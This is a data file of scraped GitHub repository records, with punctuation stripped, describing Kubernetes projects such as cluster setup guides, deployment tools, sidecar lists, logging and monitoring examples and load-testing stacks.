happyxhw,k8s,,k8s k8s 1 kind 2 minikube 3 microk8s 4 rke rancher 5 kind minikube microk8s ubuntu loT snap rke rancher k8s rke k8s etc hosts172 16 12 188 ip 172 16 12 188 happyk8s me dashboard 172 16 12 188 grafana me grafana 172 16 12 188 prometheus me prometheus 172 16 12 188 kiali me kiali https github com happyxhw k8s 1 1 2 3 kvm ubuntu server 20 04 LTS CPU4 8G archlinux manjaro kvm bash sudo pacman S libvirt qemu headless ebtables virt manager sudo systemctl start libvirt sudo systemctl enable libvirt systemctl status libvirt ubuntu server 20 04 docker https docs docker com engine install ubuntu bash sudo apt get update sudo apt get install apt transport https ca certificates curl gnupg agent software properties common curl fsSL https download docker com linux ubuntu gpg sudo apt key add sudo add apt repository deb arch amd64 https download docker com linux ubuntu lsbrelease cs stable sudo apt get update sudo apt get install docker ce docker ce cli containerd io sudo usermod aG docker USER kubectl https kubernetes io zh docs tasks tools install kubectl curl LO https storage googleapis com kubernetes release release curl s https storage googleapis com kubernetes release release stable txt bin linux amd64 kubectl helm v3 https helm sh docs intro quickstart https github com helm helm releases rke v1 2 3 https rancher com docs rke latest en installation istioctl v1 7 4 https istio io latest docs setup getting started https istio io latest docs setup getting started download curl L https istio io downloadIstio sh swap sudo swapoff a sudo vim etc fstab swap swap sudo ufw disable ntp sudo tzselect sudo cp usr share zoneinfo Asia Shanghai etc localtime docker sudo mkdir p etc docker sudo tee etc docker daemon json EOF registry mirrors https m2ybj6zs mirror aliyuncs com EOF sudo systemctl daemon reload sudo systemctl restart docker localhost ssh key shell ssh copy id happyxhw 192 168 122 80 rke https rancher com docs rke latest en installation rke single cluster yml yml nodes 127 0 0 1ip internaladdress 192 168 122 80 address 192 168 122 80 user happyxhw role controlplane etcd worker sshkeypath home happyxhw ssh idrsa labels app ingress If set to true RKE will not fail when unsupported Docker version are found ignoredockerversion true Cluster level SSH private key Used if no ssh information is set for the node sshagentauth false clustername happyk8s kubernetesversion v1 17 3 rancher1 1 authorization mode rbac Add ons are deployed using kubernetes jobs RKE will give up on trying to get the job status after this timeout in seconds addonjobtimeout 30 Specify network plugin in canal calico flannel weave or none network plugin canal Specify DNS provider coredns or kube dns dns provider coredns Currently only nginx ingress provider is supported To disable ingress controller set provider none nodeselector controls ingress placement and is optional ingress provider nginx nodeselector app ingress rke three cluster yml yml nodes internaladdress 192 168 122 201 address 192 168 122 201 user k8s role controlplane etcd worker sshkeypath home k8s ssh k8srsa internaladdress 192 168 122 202 address 192 168 122 202 user k8s role worker sshkeypath home k8s ssh k8srsa internaladdress 192 168 122 203 address 192 168 122 203 user k8s role worker sshkeypath home k8s ssh k8srsa labels app ingress If set to true RKE will not fail when unsupported Docker version are found ignoredockerversion true Cluster level SSH private key Used if no ssh information is set for the node sshagentauth false clustername happyk8s kubernetesversion v1 17 3 rancher1 1 authorization mode rbac Add ons are deployed using kubernetes jobs RKE will give up on trying to get the job status after this timeout in seconds addonjobtimeout 30 Specify network plugin in canal calico flannel weave or none network plugin canal Specify DNS provider coredns or kube dns dns provider coredns Currently only nginx ingress provider is supported To disable ingress controller set provider none nodeselector controls ingress placement and is optional ingress provider nginx nodeselector app ingress rke up config singlecluster yml cluter yml ssh ssh rkenetwordplugin ip 127 0 0 1localhost shell rke remove config singlecluster yml KUBECONFIG kubectl shell export KUBECONFIG pwd kubeconfigcluster yml kube configkubectl mkdir kube touch kube config kubeconfigcluster yml kube config chmod 600 kube config helm dashboard etc hosts happyk8s me etc hosts 192 168 122 80 happyk8s me ssl secret openssl req x509 nodes days 3650 newkey rsa 2048 keyout kube dashboard key out kube dashboard crt subj CN happyk8s me O happyk8s me kubectl create secret tls kube dasboard ssl key kube dashboard key cert kube dashboard crt n kubernetes dashboard deploy kubectl apply f https raw githubusercontent com kubernetes dashboard v2 0 0 beta8 aio deploy recommended yaml kubectl apply f recommend yml rbac kubectl apply f admin user yml kubectl apply f admin user role yml token kubectl n kubernetes dashboard describe secret admin user token grep token kube prometheus git clone https github com prometheus operator kube prometheus cd kube prometheus kubectl apply f manifests setup kubectl apply f manifests ingress kubectl apply f istio grafana ingress yml kubectl apply f istio prometheus ingress yml grafana me istio istioctl install set profile default promethues istio system kubectl apply f istio prometheus rbac yml istio system service monitor kubectl apply f istio monitor yml kiali helm install namespace istio system set auth strategy anonymous repo https kiali org helm charts kiali server kiali server ingress kubectl apply f istio kiali ingress yml kiali me kiali configmap promethues istio system dashboard istio system kiali configmap yml externalservices grafana externalservices customdashboards enabled true prometheus url http prometheus k8s monitoring svc 9090 kiali pod configmap kiali jaeger,2020-11-24T09:25:23Z,2020-12-09T17:12:20Z,Shell,User,1,2,0,2,master,happyxhw,1,0,0,0,0,0,0
00theway,K8sHound,,K8sHound K8s information collection TODO 1 k8s servicetoken,2020-12-15T03:15:54Z,2020-12-16T06:40:22Z,n/a,User,1,2,0,2,main,00theway,1,0,0,0,0,0,0
chazsconi,elixir_k8s_deploy,,K8S Deploy Library for deploying Elixir web apps to Kubernetes Used in combination with dockerbuild https hex pm packages dockerbuild library It will build a docker image of your app push it and then deploy it to K8S by creating a K8S Deployment Service and Ingress for your app It will also request a Letsencrypt SSL cert for your app Prerequisites A K8S cluster The K8S cluster installed and configured with Cert manager https cert manager io to issue Letsencrypt SSL certificates kubectl installed and configured to access your K8S server A Docker registry available for your image Gitlab currently provides a limited free private registry Pull secrets configured on your cluster to access the image on the Docker registry Installation Add to mix exs elixir def deps do k8sdeploy 0 1 0 runtime false only dev end Install and configure dockerbuild to build your docker image for you Basic Use Create the following entries in config dev exs As you will run the mix tasks in the development environment you should only add them here elixir config dev exs config k8sdeploy K8SDeploy Deploy context my k8s cluster com The kubectl context name in kubectl imagepullsecrets my pull secret Unless a public docker image is used this must be set up before certmanagerissuer letsencrypt prod This needs to be set up before host www mysite com HTTPS host Deploy To build a docker image and deploy bash mix k8s deploy For additional options run bash mix help k8s deploy Advanced usage Additional configuration The following additional config values are available fromtowwwredirect if your want the Ingress to perform an automatic redirection from the non www version of your site to the www version or vice versa Defaults to true if the host starts with www Specify the canonical version in host envvars Map of environment variables that will be set in the K8S Deployment e g FOO BAR The following environment variables are automatically injected PORT set to 4000 URLHOST set to the host value in the config if set migrator Module name or mfa tuple for running migrations See Running Migrations below probepath URL path without host or port to be used for a K8S container readinessProbe and livenessProbe Specify a URL that returns a 200 without a login In most cases should be suitable If not set no probes are created Using a ConfigMap for environment variables Instead of providing environment variables via the envvars key you can provide a K8S ConfigMap in the deploy k8s folder with the name configmap prod yaml If using a different environment change prod to match The name of the ConfigMap must match the appname key specified in the dockerbuild config with the suffix configmap This will be referenced using envFrom in the Deployment For example yaml apiVersion v1 kind ConfigMap metadata name myapp configmap data FOO BAR FOO2 BAR2 Running migrations To run migrations set the migrator config key to either a module name e g MyApp Release which contains a migrate 0 function or a mfa e g MyApp Release migrate You can create the necessary code by following the recommendation in Phoenix https hexdocs pm phoenix releases html ecto migrations and custom commands A K8S Job will be created using the same docker image It will execute the migrate function and run to completion before the deploy continutes Any ConfigMap or vars in envvars will be available in to the Pod container that the job creates Deploying without an ingress If you omit the host field no ingress will be deployed unless you have a custom template see below You might use this if another app deploys the ingress rules for this app Deploying to multiple contexts You can also specify context as a list All K8S resources will then be deployed to each context in turn Using a custom Deployment Service or Ingress template If you need to customise the templates beyond what the configuration options provide you can place your own template in your project in the location deploy k8s resource environment yaml For example deployment prod yaml for a custom Deployment template These files can include EEx templating and accept the same variables as the default templates see priv templates e g or in the Deployment template N B The deploymentid variable is an integer so it must be quoted in your template TODO Run git push origin master production after deploy Have option to ask for key press before deploying Support different environments e g mix k8s deploy staging with an environment setting and overrides in config Block until deploy complete,2020-09-11T20:57:39Z,2020-10-14T07:31:09Z,Elixir,User,1,2,0,17,master,chazsconi,1,0,0,0,0,0,0
6BD-org,mediumkube,,Setup a k8s cluster using multipass This is a very simple toolkit that helps setup a K8s cluster easily In order to learn some network knowledges about K8s Easy to use Unconfigurable networks Very simple templating Still need to init and join nodes manually No distributed deployment Like a minikube but you ll have real nodes to access to If you got the effort you can config them for advanced uses Prepare Install multipass bash sudo apt install multipass In order to use multipass behind a proxy use following command bash sudo snap set multipass proxy http http host port Template configurations Most important of all prepare three keys Public key of your host machine Generated Private key for cluster machine Generated Public key for cluster machine These are used to setup trust relations between your host and the cluster as well as cluster nodes When your keys are ready modify the configuration file to point to those key files like this yaml pub key dir home temp ssh cloud pub priv key dir home temp ssh cloud host pub key dir home temp ssh idrsa pub Then get your ubuntu image img file ready or you can simple use remote image if you are outside the bitch ass motherfucking firewall Also configure the cloud init yaml location It is already pointed to cloud init yaml which is the default output of template renderer If you change this make sure it exists yaml image file home temp u20 04 img cloud init cloud init yaml Finally if you need proxy do configurations like this yaml http proxy http localhost 1091 https proxy http localhost 1091 and use HTTPSProxy to configure your software However if no proxy is required remember to remote related template tokens from tmpl file This may take some effort smirk Now you are ready to go build the project and setup your cluster Test Build Golang officially https golang org pkg testing suggests to put test files together with bussiness logic but we have too many mock data files so note that ALL unit tests are located in tests To run test bash go test tests In order to build the project bash hack build sh This will generate an executable main in project root Templating Guide In order to simplify the configuration we support configuration and template rendering there are pre build options which are proxies yaml http proxy 172 16 184 20 1091 https proxy 172 16 184 20 1091 In order to use configuration instead of writing proxies everywhere use HttpProxy and HttpsProxy Also be careful when processing data sensitive fields like private key Using go template might introduce one newline to template file so remember to trim yaml privKey PrivKey nindent 6 For example this is translated to yaml privKey Note there s a newline below thus the key is incorrect BEGIN RSA PRIVATE KEY asdasdasdasdasdasd Instead you do this yaml privKey PrivKey nindent 6 in your yaml tmpl file and render it using that simple go program bash main render To get help of available commands bash List available commands main help Get help of sub commands main render help Multipass compatibility This cli is fully compatible with multipass You can replace multipass with main or any executable name that you build Just for consistent looking smirk bash These commands are identical multipass list main list Checkout the multipass documentation https multipass run docs working with instances Launch instance bash c 2 uses 2 cpus m 2G 2G memory d 20G 20G disk n node01 node named node01 file path to img file multipass launch v n node01 cloud init cloud init yaml c 2 m 2G d 20G file home temp u20 04 img A better way of launching instance is via cli bash main deploy config cloud init yaml purge instance bash hack purge sh instancename To purge multiple nodes at the same time hack purge sh node1 node2 node3 Start K8s cluster We normally don t have enough resource for launching cluster so add this flag ignore preflight errors all To start a master node do this on node01 kubeadm init ignore preflight errors all A better way of starting k8s cluster is using out cli after configuring kube init section properly main init config config yaml Logging To check the log of multipass bash journalctl unit snap multipass If you are executing commands in the virtual machine during init make sure to save logs to file for analysis In cloud init yaml runcmd sh dosomething sh var log bootstrap dosomething log We support logging side car This will mount the log directort inside the vm to host machine and start go routines to watch those file changes Mounting in init stage is not officially supported so we implemented it with ugly loop inside a go routine This should be fixed as soon as multipass supports mounting Also think about watching ssh files In order to specify the log directory in vm add this config yaml vmlogdir var log bootstrap The logs will be mounted to tmp directory of mediumkube About CLI For ease of development this cli only contains 2 layers of command hierarchy and key word arguments like following main command sub command key1 val1 key2 val2 excepting help Get help of available sub commands main command help Get help of particular sub command main command sub command help You can extend the layer of course by intercepting args and pass them through to another command handler then you get this main command sub command 1 sub command 2 key val But I personally don t encourage either adding more layers or mixing up positional and keyword arguments Install resource to kubernetes using MediumKube Following types are currently supported You are free to add more if you need them golang resourceType PodSecurityPolicy v1beta1 PodSecurityPolicy resourceType ClusterRole v1 ClusterRole resourceType ClusterRoleBinding v1 ClusterRoleBinding resourceType ServiceAccount coreV1 ServiceAccount resourceType ConfigMap coreV1 ConfigMap resourceType DaemonSet appsV1 DaemonSet resourceType StatefulSet appsV1 StatefulSet You can edit your yaml outside the cluster using your favorite text editor and submit them using the command bash mediumkube apply my yaml Roadmap Cli tool for cluster management Cluster deployment Deletion Adding Removing nodes Deploy kubernetes resources Setup flannel network Better template engine,2020-10-28T10:36:06Z,2020-12-28T03:13:52Z,Go,Organization,1,2,1,22,master,wylswz,1,0,1,4,3,0,16
wwbgo,tdengine-k8s,,tdengine k8s taos tdengine docker k8s TDengine cluster for kubernetes TDengine cluster for docker What is TDengine TDengine is an open sourced big data platform under GNU AGPL v3 0 http www gnu org licenses agpl 3 0 html designed and optimized for the Internet of Things IoT Connected Cars Industrial IoT and IT Infrastructure and Application Monitoring Besides the 10x faster time series database it provides caching stream computing message queuing and other functionalities to reduce the complexity and cost of development and operation 10x Faster on Insert Query Speeds Through the innovative design on storage on a single core machine over 20K requests can be processed millions of data points can be ingested and over 10 million data points can be retrieved in a second It is 10 times faster than other databases 1 5 Hardware Cloud Service Costs Compared with typical big data solutions less than 1 5 of computing resources are required Via column based storage and tuned compression algorithms for different data types less than 1 10 of storage space is needed Full Stack for Time Series Data By integrating a database with message queuing caching and stream computing features together it is no longer necessary to integrate Kafka Redis HBase Spark or other software It makes the system architecture much simpler and more robust Powerful Data Analysis Whether it is 10 years or one minute ago data can be queried just by specifying the time range Data can be aggregated over time multiple time streams or both Ad Hoc queries or analyses can be executed via TDengine shell Python R or Matlab Seamless Integration with Other Tools Telegraf Grafana Matlab R and other tools can be integrated with TDengine without a line of code MQTT OPC Hadoop Spark and many others will be integrated soon Zero Management No Learning Curve It takes only seconds to download install and run it successfully there are no other dependencies Automatic partitioning on tables or DBs Standard SQL is used with C C Python JDBC Go and RESTful connectors Documentation For user manual system design and architecture engineering blogs refer to TDengine Documentation https www taosdata com en documentation https www taosdata com cn documentation20 for details The documentation from our website can also be downloaded locally from documentation tdenginedocs en or documentation tdenginedocs cn TODO TDengine,2020-09-07T11:25:54Z,2020-12-26T15:15:17Z,Smarty,User,1,2,0,4,master,wwbgo,1,0,0,0,0,0,0
OmerKahani,awesome-sidecar,,Awesome sidecar This list contains projects that can run as a sidecar in k8s learn more about sidecars sidecar explained md Please open a PR to add new project to the list Service Mesh Load Balancer https github com istio proxy part of Istio uses envoy as a proxy sidecar https github com linkerd linkerd2 proxy part of Linkerd full proxy load balancer implemented in Ruts https github com minio sidekick High Performance HTTP Sidecar Load Balancer https github com envoyproxy envoy High Performance edge middle service proxy CNCF graduated project Secrets https github com Talend vault sidecar injector part of HashiCorp Vault for fetching secrets from Vault Logs https github com h3poteto fluentd sidecar injector ship log files using Fluentd https github com infolinks loggly sidecar ship logs files using Loggly Authentication and Authorisation https github com yahoojapan athenz client sidecar retrieve authentication and authorization credential from Athenz server https github com louketo louketo proxy formelly Keycloak gateway A OpenID Proxy service RBAC https github com brancz kube rbac proxy Perform RBAC authorization against the Kubernetes API using HTTP proxy Leader Election https github com vapor ware k8s elector adds a leader election capability to a deployment Dynamic Configuration https github com kiwigrid k8s sidecar watch a config map and sends an HTTP request after a change https github com jimmidyson configmap reload watch a config map and sends an HTTP request after a change Storage https github com signaleleven s3fs sidecar mount an s3 bucket to a shared volume https github com GoogleCloudPlatform gcsfuse mount an Google Cloud Storage bucket to a shared volume https github com kubernetes git sync clones a git repo into a shared volume keeps it in sync and sends an HTTP request after a change Database https github com cvallance mongo k8s sidecar Adds new replicas to the mongo container automatically https github com GoogleCloudPlatform cloudsql proxy deploying cloud sql proxy as a sidecar container allows a user to connect to a Cloud SQL database without having to deal with IP whitelisting or SSL certificates manually,2020-10-19T13:41:44Z,2020-11-19T19:55:46Z,n/a,User,2,2,2,12,main,OmerKahani#mik-laj,2,0,0,0,0,0,4
CliXiD,k8s-init,,k8s init Create K8S cluster on CentOS 1 Install and configure system 00 master sh run on master node 00 worker sh run on each worker nodes 2 Install network controller flannel and prepare the discovery file 01 manual master sh run on master node recommend to execute manually check all pods are ready before next one check comments in script to copy the discovery file to each worker nodes 3 Join with all workers 02 manual worker sh run on each worker nodes 4 Install helm nfs client and nginx ingress controller 03 manual master sh,2020-10-06T14:08:05Z,2020-11-17T15:09:27Z,Shell,User,2,2,1,4,master,CliXiD,1,0,0,0,0,0,0
damiannolan,go-template,docker#go#golang#helm#k8s#kubernetes,Go HTTP Service Template Getting Started Go is an open source programming language that makes it easy to build simple reliable and efficient software A comprehensive guide to getting up and running with a Go Golang development environment Prerequisites Git https git scm com downloads Make https www gnu org software make Basic programming skills An IDE of your choice Visual Studio Code https code visualstudio com download Recommended Download and Install Navigate to https golang org dl and choose a suitable binary release for your system Download the installer and follow the onscreen instructions provided by the installation wizard Preparing VS Code Microsoft provides the most popular extension for Visual Studio Code for Go development It can be downloaded through the Extensions tab on the left sidebar navigation menu or accessed through the keyboard shortcut ctrl shift x Open Exensions and search for Rich Go Language Support for Visual Studio Code vscode extension https i gyazo com a6ae59cab194869fd83c251c6aa09eeb png Note you may be prompted to restart your editor or to allow the extension to install a number of dependencies For example The extension makes use of existing packages for some common tasks such as organised imports and code formatting on save actions through goimports and gofmt respectively Verifying your Go Installation Create a file hello go and paste in the following go package main import fmt func main fmt Printf hello world Here we are importing package fmt Package fmt implements formatted I O with functions analogous to C s printf and scanf See https golang org pkg fmt Save the file in the current directory and open a terminal window Run the following command bash go run hello go hello world You re now ready to start coding in Go Go Modules Overview This project has already been setup to use Go Modules https blog golang org using go modules as it s dependency management tool Go Modules was added in Go 1 11 and is being actively improved ever since It is built into the Go Toolchain and now the defacto standard for dependency management in Go Proir to Go 1 13 developers must enable Modules through the env var GO111MODULE on As of Go 1 13 Module mode is the default for all development For more on Go Modules checkout the official documentation https blog golang org using go modules 4 part blog series and for an insight into transitioning to Go Modules checkout this article https dev to maelvls why is go111module everywhere and everything about go modules 24k Configuration for non public modules In order to use private modules e g from a company repository set the env variable GOPRIVATE https golang org cmd go hdr Moduleconfigurationfornonpublicmodules The go command defaults to downloading modules from the public Go module mirror at proxy golang org It also defaults to validating downloaded modules regardless of source against the public Go checksum database at sum golang org The GOPRIVATE environment variable controls which modules the go command considers to be private not available publicly and should therefore not use the proxy or checksum database The enviornment variable is a comma separated list of glob patterns in the syntax of Go s path Match of module path prefixes Set the env variable in your shell or if using Windows configure through the Windows environment variables UI bash export GOPRIVATE example mycompany com Quick Start 1 Initializing a new Go Module for a fresh project can achieved through the go mod init command For example bash go mod init github com damiannolan go template 2 Downloading a dependency can be done through the use of the go get command For example bash go get github com Shopify sarama Specificying a particular branch or semantic version tag bash go get github com Shopify sarama pr feature branch go get github com Shopify sarama v1 27 1 3 Other useful commands are included below more information can be acquired through go help mod Download modules to local cache This is useful for scenarios such as Docker builds See the project Dockerfile Dockerfile for an example where Go Modules files are copied into the working directory and go mod download is run in order to cache dependency in an image layer Only if dependencies have changed they are re downloaded This improves build time when developing bash go mod download Dependencies can be cleaned up whereby the Go Modules tool adds missing and removes unused modules bash go mod tidy Maintaining a local vendored copy of dependencies This downloads and creates a vendor directory at the root of the Module bash go mod vendor Verify the expected content of modules bash go mod verify Makefile Usage The project template provides a Makefile containing a set of directives for common tasks such as Docker Builds Helm Deployments Unit Testing Versioning Makefiles are very common in Go projects and are often setup to accomodate the needs of a particular project or application Tasks are executed via the make command The Makefile can be easily extended to allow developers the opportunity to add their own custom directives for automating tasks More information can be found at GNU Make GNU org https www gnu org software make manual make html Building Docker Images Building and pushing an application image bash make docker build make docker push Building and pushing a development image Here the image tag is a reference to the user acquired through shell whoami bash make docker build dev make docker push dev Helm Deployments Deploy to a Kubernetes cluster via Helm bash make helm deploy make helm deploy dev Unit Testing Unit Testing in Go is performed through the Go Toolchain via the go test command A directive has been included to run tests from all directories and output a coverage out file which can be analysed by reporting tools such as Sonar Running application unit tests bash make test,2020-10-12T22:57:16Z,2020-10-19T20:14:22Z,Go,User,2,2,1,11,master,damiannolan,1,0,0,0,0,0,1
bbachi,k8s-init-container-pattern,,k8s init container pattern Example Project on K8s Init container pattern,2020-08-30T03:50:55Z,2020-10-08T19:34:48Z,n/a,User,2,2,0,4,master,bbachi,1,0,0,0,0,0,0
ltblueberry,efk-k8s-example,efk#elasticsearch#example#example-project#fluentbit#k8s#kibana,Example of EFK in K8S cluster Example the kubernetes cluster with configured persistent volumes and ingress controller kubectl installation guide is here https kubernetes io docs tasks tools install kubectl helm installation guide is here https helm sh docs intro install example domain kibana example com Namespace Create the monitoring namespace kubectl create namespace monitoring created namespace screenshots screenshot namespace png Elasticsearch Install Elasticsearch from this helm chart https github com elastic helm charts tree master elasticsearch Add and update elastic helm repository helm repo add elastic https helm elastic co helm repo update elastic helm repo screenshots screenshot elastic helm repo png Deploy elasticsearch release from the helm chart helm install elasticsearch elastic elasticsearch set imageTag 7 9 1 n monitoring or if you want to change the storage size helm install elasticsearch elastic elasticsearch set imageTag 7 9 1 volumeClaimTemplate resources requests storage 60Gi n monitoring elastic pods screenshots screenshot elastic pods png Kibana Deploy Kibana manifests kibana kubectl apply f kibana kibana deploy screenshots screenshot kibana deploy png Example domain Add our example domain to etc hosts 34 66 45 242 kibana example com Kibana Lifecycle Policy Open Kibana in web browser kibana example com Create Index Lifecycle Policy to delete stale indices Go to the side menu and open Management Dev Tools kibana dev tools screenshots screenshot kibana dev tools png Next request will create Index Lifecycle Policy that will delete indices older that 20 days PUT ilm policy delete 20 days policy phases delete minage 20d actions delete kibana policy screenshots screenshot kibana policy png Next request will create Index Template and bind the created lifecycle policy PUT template exampletemplate indexpatterns example settings index lifecycle name delete 20 days kibana index template screenshots screenshot kibana index template png Now all indices that match the example index template will apply that lifecycle policy when created Fluent Bit Official installation guide https docs fluentbit io manual installation kubernetes installation Deploy FluentBit manifests fluentbit kubectl apply f fluentbit fluentbit deploy screenshots screenshot fluentbit deploy png configmap yaml configuration for Fluent Bit INPUT define Tag Regex to match by namespace FILTER define custom parser k8s custom tag OUTPUT match only example namespace and write to example index PARSER parser for defined tag regex Generate demo data Create the example namespace kubectl create namespace example Deploy log generator pod kubectl apply f example pod yaml log generator deploy screenshots screenshot log generator deploy png Check out example logs Open Kibana in web browser kibana example com Go to the side menu and open Management Stack Management Index Management Check out our new example index kibana index management screenshots screenshot kibana index management png Check out the index detail info about the lifecycle policy kibana index management policy screenshots screenshot kibana index management policy png Create new Index Pattern for our example indecies It should match all indecies that start with example kibana index management policy screenshots screenshot kibana index pattern png Select time field timestamp kibana index management policy screenshots screenshot kibana index pattern time field png Check out logs from the log generator Go to the side menu and open Kibana Discover and select the index pattern kibana discover screenshots screenshot kibana discover png,2020-11-27T12:41:12Z,2020-11-30T11:39:25Z,n/a,User,2,2,0,16,master,ltblueberry,1,0,0,0,0,0,0
dealroadshow,k8s-bundle,,Dealroadshow K8S Bundle This bundle integrates Dealroadshow K8S framework https github com dealroadshow k8s framework with Symfony 5 Installation Use Composer to install this bundle into your Symfony application bash composer require dealroadshow k8s bundle Basic usage Let s generate your first Kubernetes App you may think of App like of Helm chart bash bin console k8s generate app example This command will create src K8S Example directory and AppK8SExampleExampleApp PHP class App is an abstraction which exists in order to group together some Kubernetes manifests like Deployments CronJobs or ConfigMaps Now that we have a project and an app we can start to define our Kubernetes manifests Let s start by creating a deployment bash bin console k8s generate manifest nginx deployment example After executing this command you ll see a new class AppK8SExampleManifestsNginxNginxDeployment This new class may look like follows php php namespace AppK8SExampleManifestsNginx use DealroadshowK8SFrameworkCoreDeploymentAbstractDeployment use DealroadshowK8SFrameworkCoreLabelSelectorSelectorConfigurator use DealroadshowK8SFrameworkCoreMetadataConfigurator use DealroadshowK8SFrameworkCorePodContainersPodContainers class NginxDeployment extends AbstractDeployment public function selector SelectorConfigurator selector void public static function shortName string return nginx public function fileNameWithoutExtension string return nginx deployment public function containers PodContainers containers void Let s start by implementing some of existing methods and some others from basic class php php namespace AppK8SExampleNginx use DealroadshowK8SFrameworkCoreContainerAbstractContainer use DealroadshowK8SFrameworkCoreContainerEnvEnvConfigurator use DealroadshowK8SFrameworkCoreContainerImageImage use DealroadshowK8SFrameworkCoreDeploymentAbstractDeployment use DealroadshowK8SFrameworkCoreContainerResourcesCPU use DealroadshowK8SFrameworkCoreContainerResourcesMemory use DealroadshowK8SFrameworkCoreContainerResourcesResourcesConfigurator use DealroadshowK8SFrameworkCoreLabelSelectorSelectorConfigurator use DealroadshowK8SFrameworkCoreMetadataConfigurator use DealroadshowK8SFrameworkCorePodContainersPodContainers class NginxDeployment extends AbstractDeployment public function selector SelectorConfigurator selector void selector addLabel app example app addLabel component my first deployment public static function shortName string return nginx public function fileNameWithoutExtension string return nginx deployment public function containers PodContainers containers void container new class extends AbstractContainer public function name string return nginx public function image Image return Image fromName nginx public function resources ResourcesConfigurator resources void resources requestCPU CPU millicores 500 limitCPU CPU cores 2 requestMemory Memory mebibytes 128 limitMemory Memory mebibytes 256 public function env EnvConfigurator env void env var APPNAME nginx example app containers add container We ve defined a basic deployment and we can generate Yaml manifest from it bash bin console k8s dump all Now you can see your Yaml manifest in Resources k8s manifests directory inside your project Nice,2020-10-06T21:00:11Z,2020-12-13T19:29:04Z,PHP,Organization,3,2,1,64,master,bpasfinsight#petr-buchyn#petr-buchin,3,20,20,0,0,0,10
alejandrolr,monitoring-workshop,,Monitoring Workshop Code to deploy all necessary tools for the monitoring workshop Prerequisites 1 A kubernetes cluster to deploy all elements You can use one of the following local clusters Minikube https minikube sigs k8s io docs start Install MacOS Docker Desktop and configure Docker Desktop Local Kubernetes Cluster https docs docker com docker for mac kubernetes easiest way for MacOs Users Kind cluster https kind sigs k8s io docs user quick start 2 kubectl installed and pointing to local cluster context Installation tutorial here https kubernetes io es docs tasks tools install kubectl 3 Helm installed locally Installation tutorial here https helm sh docs intro install through package managers Stack deployment To deploy stack use the following script bash deploystack sh Cleaning environment Deleting stack To delete all the stack use the following script bash deletestack sh Accessing UI via web browser Once deployed stack web interfaces can be exposed via port forward https kubernetes io docs tasks access application cluster port forward access application cluster mapping the pod application port to a local port to access the service via localhost port Note This is the easiest way to expose a service locally Another options to expose services involve using ingresses Nodeport LoadBalancer services etc More information about accesing apps in a cluster here https kubernetes io docs tasks access application cluster Accessing Prometheus UI 1 Expose Prometheus port bash Get Prometheus Pod Name export PODNAME kubectl get pods namespace default l app prometheus component server o jsonpath items 0 metadata name Expose Prometheus port 9090 via port forward kubectl namespace default port forward PODNAME 9090 2 Go to http localhost 9090 in a web browser to access prometheus UI Accessing Grafana UI 1 Get grafana admin password bash kubectl get secret namespace default grafana o jsonpath data admin password base64 decode echo 2 Expose Grafana port bash Get Grafana Pod Name export PODNAME kubectl get pods namespace default l app kubernetes io name grafana app kubernetes io instance grafana o jsonpath items 0 metadata name Expose Grafana port 3000 via port forward kubectl namespace default port forward PODNAME 3000 3 Go to http localhost 3000 in a web browser to access grafana UI Access using admin and password from step 1 Accessing Angular App UI 1 Expose angular app port bash Get angular app Pod Name export PODNAME kubectl get pods namespace default l app angular app o jsonpath items 0 metadata name Expose angular app port 80 via port forward to local port 8080 kubectl namespace default port forward PODNAME 8080 80 2 Go to http localhost 8080 in a web browser to access angular app UI,2020-11-16T16:09:33Z,2020-11-27T20:21:47Z,HTML,User,2,2,0,10,main,alejandrolr,1,0,0,0,0,0,0
johnmarcou,kdiff,,Kdiff Essentialy a yaml differ but K8s way Install pip install git git github com johnmarcou kdiff Upgrade pip install git git github com johnmarcou kdiff upgrade Example kdiff examples ns yaml examples ns label yaml Modified Namespace default apiVersion v1 kind Namespace metadata labels mylabel ok name default Uninstall pip unsintall kdiff y,2020-08-20T04:02:37Z,2020-09-18T03:51:15Z,Python,User,1,2,0,4,master,johnmarcou,1,0,0,0,0,0,0
chao-hu,websocket-proxy,,websocket proxy java websocket proxy k8s docker terminal ckek8s cke sa ckeapi serverapiserver token ckeclb proxy k8s terminalcke proxyk8s terminalclb,2020-10-12T03:23:52Z,2020-11-19T10:14:28Z,Java,User,1,2,2,1,main,chao-hu,1,0,0,0,0,0,0
bineetNaidu,microservices-blog-app,,,2020-11-26T12:24:52Z,2020-11-26T14:00:30Z,JavaScript,User,1,2,0,10,master,bineetNaidu,1,0,0,0,0,0,3
kaparora,hashitalks-demo-nov-2020,,hashitalks november 2020 demo My test Env 1 Docker Desktop v2 5 0 1 on Mac with kubernetes enabled 2 Docker Engine 19 03 13 3 Kubernete v1 19 3 4 Helm v3 2 1 3 MacOS 10 15 6 Hashitalks Novemeber 2020 demo scripts This is a bunch of shell scripts to test HashiCorp Vault K8S integration including secret injection We use the k8s auth method mysql db secret engine dynamic secrets and transit secret engine This is tested on my Macbook with Docker desktop with k8s All services are exposed using NodePort In case you are using a remote k8s cluster you may need to make changes and update the VAULTADDR env variable to run the scripts locally,2020-11-27T15:16:44Z,2020-12-04T17:09:06Z,Python,User,1,2,1,0,master,,0,0,0,0,0,0,0
gogateway,dev,,dev ingress k8s ingress K8Singressnginx ingress dev proxyk8s k8snodePort30000 32767 vim etc kubernetes manifests kube apiserver yaml service node port range 80 65535 k8s kubectl apply f k8s yaml kubectl apply f dev service yaml http ip admin kong kong proxy kubectl get svc o wide image doc svc jpg kong kong kong proxy k8s http ip kong,2020-08-22T06:34:34Z,2020-12-17T12:15:03Z,Go,Organization,1,2,0,2,master,rushuinet,1,1,1,0,0,0,0
lreimer,continuous-k6k8s,continuous-testing#k6#k8s#load-testing#performance-testing#pulumi,Continuous K6 Performance Tests on K8s Continuous K6 performance and load tests on Kubernetes We will spin up an InfluxDB to store our load test data and Grafana to display The K6 load test will continuously be executed using a CronJob Usage with plain YAML bash first we deploy the demo application deployment kubectl apply f continuous nginx yaml next you can deploy the K6 stack with InfluxDB and Grafana kubectl apply f continuous k6k8s yaml open Grafana and import on of these K6 load test dashboards see https grafana com dashboards 2587 see https grafana com grafana dashboards 4411 open http localhost 3000 Usage with Pulumi Just for fun I also created Pulumi infrastructure as code to create the Continuous K6 load test stack bash to create the Pulumi code from scratch type this pulumi new kubernetes typescript force kube2pulumi typescript f continuous k6k8s yaml and fire up the K6 stack pulumi up open Grafana and import on of these K6 load test dashboards see https grafana com dashboards 2587 see https grafana com grafana dashboards 4411 open http localhost 3000 Create retention policy for InfluxDB If you run the load tests continuously you may want to create a retention policy to cleanup the test data from time to time bash connect to the influx pod kubectl exec it pod influxdb bin sh influx create retention policy k61d on k6 duration 